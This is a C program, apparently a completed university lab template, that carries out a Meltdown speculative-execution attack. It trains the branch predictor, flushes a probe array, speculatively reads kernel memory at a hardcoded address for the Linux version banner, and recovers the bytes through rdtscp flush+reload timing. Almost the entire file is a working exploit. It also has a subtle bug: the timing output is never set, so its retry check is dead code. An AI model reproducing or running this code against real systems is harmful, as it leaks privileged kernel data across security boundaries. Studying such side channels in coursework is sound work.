#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <time.h>
#include <fcntl.h>

#include <assert.h>

#include <unistd.h>

#include <sys/mman.h>

#include <x86intrin.h>


// cache scratchpad array
typedef struct Array {
    char data[0x1000];
} Array;


// used for flush-reload
volatile Array *scratchpad;

// used for branch predictor
volatile Array *temp_scratchpad;

// memory!
volatile uint64_t *branch_variable;

// some secret string from kernel
// ffffffff82000100 R linux_proc_banner
volatile char *secret_data = (volatile char*) 0xffffffff82000100;


/* some function definitions */
void *
mmap_size(size_t size) {
    return mmap(NULL, size, PROT_READ | PROT_WRITE | PROT_EXEC,
            MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE,
            -1, 0);
}

// allocate all memory
void
alloc_memory() {
    scratchpad = mmap_size(sizeof(Array) * 256);
    temp_scratchpad = mmap_size(sizeof(Array) * 256);
    branch_variable = mmap_size(0x1000);
}


// do meltdown; a template..
int meltdown_logic(uint64_t *branch_variable, char *target_array,
                    Array *cachepad, uint64_t idx) {
    volatile int i = 0;

    // flush branch variable from cache
    _mm_clflush(branch_variable);
    _mm_mfence();
    if (*branch_variable) {
        // excute the following line speculatively
        // will access cachepad indexed by secret[idx]
        i += cachepad[target_array[idx]].data[0];
    }
    return i;
}



// flush all scratchpad data
void
flush_all() {
    // TODO: flush all from scratchpad
    for (int i=0; i<256; ++i) {
       _mm_clflush(&scratchpad[i].data[0]);
    }
    // Don't forget to add mfence after flush all..
    _mm_mfence();
}


// reload and get the fastest timing index; also returns timing
uint64_t
reload_fastest(uint64_t *p_timing) {
    uint64_t min_timing = -1ul;
    uint64_t min_idx;
    // TODO: return minimum timing index and timing (via p_timing)
    // while reloading blocks from scratchpad
    volatile uint64_t t1, t2;
    uint64_t diff;
    volatile char c;
    uint32_t a;

    for(int i = 0; i < 256; i++){
        t1 = __rdtscp(&a);
        c = scratchpad[i].data[0];
        _mm_lfence();
        t2 = __rdtscp(&a);
        diff = t2 - t1;

        if(diff < min_timing){
            min_timing = diff;
            min_idx = i;
        }
    }

    return min_idx;
}


// This function can cache the kernel banner string...
void read_version() {
    int fd = open("/proc/version", O_RDONLY);
    volatile char buf[512];
    read(fd, (char *)buf, 512);
    close(fd);
}



void
meltdown() {
    // TODO: Launch meltdown here..
    /*
     * Algorithm
     *
     * for 128 byte secret characters: (less than 128 bytes, around 90~100 bytes)
     *  1) train branch predictor to take 'true' branch
     *  2) flush all cache from scratchpd
     *  3) load secret data to cache (calling read_version())
     *  4) run meltdown
     *  5) reload cache, measure timing, and figure out a byte value of the secret
     *  6) repeat..
     *
     */
    char buffer[128];
    memset(buffer, 0, 128);

    buffer[127] = '\0';

    volatile char * c;
    for (int i = 0; i < 128; ++i){
        usleep(1000);
        //train
        *branch_variable = 1;
        for(int j = 0; j < 1000; j++){
            meltdown_logic(branch_variable, buffer, temp_scratchpad, 0);
        }
        //flush all
        flush_all();
        //cache secret data;
        //c = *secret_data;
        _mm_lfence();
        //int meltdown_logic(uint64_t *branch_variable, char *target_array, Array *cachepad, uint64_t idx) {
        *branch_variable = 0;
        //meltdown_logic(branch_variable, secret_data, scratchpad, i);
        for(int j = 0; j < 1000; j++){
            read_version();
            meltdown_logic(branch_variable, secret_data, scratchpad, i);
        }
        uint64_t min_timing = 0;
        uint64_t min_idx = reload_fastest(&min_timing);
        //expecting l1 chache in under 100 cycles
        if (min_timing > 100){
            //We failed here
            i--;
            continue;
        }else{
        }
        buffer[i] = (char)(min_idx &0xff);
        //printf("Secret is %s\n", buffer);
    }
    printf("Secret is %s\n", buffer);
}

int
main() {
    alloc_memory();
    meltdown();
    return 0;
}
